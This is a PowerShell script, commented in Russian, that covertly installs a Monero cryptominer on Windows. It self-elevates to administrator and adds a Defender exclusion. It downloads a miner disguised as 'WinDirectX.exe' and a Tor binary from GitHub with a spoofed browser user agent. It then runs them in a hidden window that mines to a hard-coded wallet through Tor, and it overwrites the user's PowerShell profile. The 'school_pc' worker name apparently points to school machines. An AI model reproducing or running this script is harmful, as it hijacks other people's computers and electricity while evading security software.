# 0. Самовозвышение
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Break
}

# --- КОНФИГУРАЦИЯ ---
$path = "C:\ProgramData\SystemLib"
$wallet = "429bPnUKuYBQQVHoap1jKTWwiPfGuKAqL7ggbTFFZdbA3LyKScc6EnP9fTVeig7jNqaF7CFhUk5eCU8S5d85gWqU6Zt6bhA" 
$procName = "WinDirectX"
$exeUrl = "https://github.com/Isfandiyor0112-star/sminers/raw/main/WinDirectX.exe"
# Новая стабильная ссылка на Tor (бинарник)
$torUrl = "https://github.com/Anonym-Org/Tor-Binaries/raw/main/tor.exe"
$rawScript = "https://raw.githubusercontent.com/Isfandiyor0112-star/sminers/main/win_utility.ps1"

Write-Host "--- ИСПРАВЛЕНИЕ ОШИБОК И ЗАПУСК ---" -ForegroundColor Cyan

# 1. Питание
powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c -ErrorAction SilentlyContinue
powercfg /x -standby-timeout-ac 0
powercfg /x -monitor-timeout-ac 5

# 2. Чистка
Stop-Process -Name $procName, "tor" -Force -ErrorAction SilentlyContinue
if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue

# 3. ЗАГРУЗКА (Маскировка под Chrome)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$web = New-Object System.Net.WebClient
$web.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

try {
    if (!(Test-Path "$path\$procName.exe")) { $web.DownloadFile($exeUrl, "$path\$procName.exe") }
    if (!(Test-Path "$path\tor.exe")) { $web.DownloadFile($torUrl, "$path\tor.exe") }
    Write-Host "[OK] Файлы скачаны" -ForegroundColor Green
} catch {
    Write-Host "[!] Проблема с сетью, пробуем принудительный BITS..." -ForegroundColor Yellow
    Start-BitsTransfer -Source $exeUrl -Destination "$path\$procName.exe" -Priority High -ErrorAction SilentlyContinue
    Start-BitsTransfer -Source $torUrl -Destination "$path\tor.exe" -Priority High -ErrorAction SilentlyContinue
}

# 4. Файлы запуска
$cmd = "@echo off`nstart /b $path\tor.exe --SocksPort 9050 --Quiet`ntimeout /t 25 /nobreak >nul`n$path\$procName.exe --title $procName --cpu-priority 1 --cpu-no-yield --cpu-max-threads-hint 50 -o gulf.moneroocean.stream:443 -u $wallet -p school_pc --algo rx/0 --tls --proxy=socks5://127.0.0.1:9050"
$cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
$vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False"
$vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii

# 5. ИСПРАВЛЕННЫЙ CHECK (Экранируем знаки доллара)
$profilePath = "$HOME\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1"
$profileDir = Split-Path $profilePath
if (!(Test-Path $profileDir)) { New-Item -Type Directory -Path $profileDir -Force | Out-Null }

# Мы используем одинарные кавычки для внешней строки, чтобы $ внутри не выполнялись
$Functions = '
function check {
    $p = Get-Process "WinDirectX" -ErrorAction SilentlyContinue
    $t = Get-Process "tor" -ErrorAction SilentlyContinue
    if ($p) { 
        $mem = [Math]::Round($p.WorkingSet64 / 1MB, 2)
        Write-Host "МАЙНЕР: РАБОТАЕТ ($mem MB)" -ForegroundColor Green 
    } else { Write-Host "МАЙНЕР: НЕ ЗАПУЩЕН" -ForegroundColor Red }
    if ($t) { Write-Host "TOR: АКТИВЕН" -ForegroundColor Green } else { Write-Host "TOR: ВЫКЛЮЧЕН (ОШИБКА СЕТИ)" -ForegroundColor Red }
}
'
$Functions | Out-File -FilePath $profilePath -Force -Encoding utf8

# 6. Старт
Start-Process -FilePath "$path\win_start.vbs"
Write-Host "`n--- ИСПРАВЛЕНО! ---" -ForegroundColor Magenta
Write-Host "1. Закрой ЭТО окно и открой НОВОЕ (Админ)." -ForegroundColor Yellow
Write-Host "2. Жди 30 сек и пиши check." -ForegroundColor Yellow
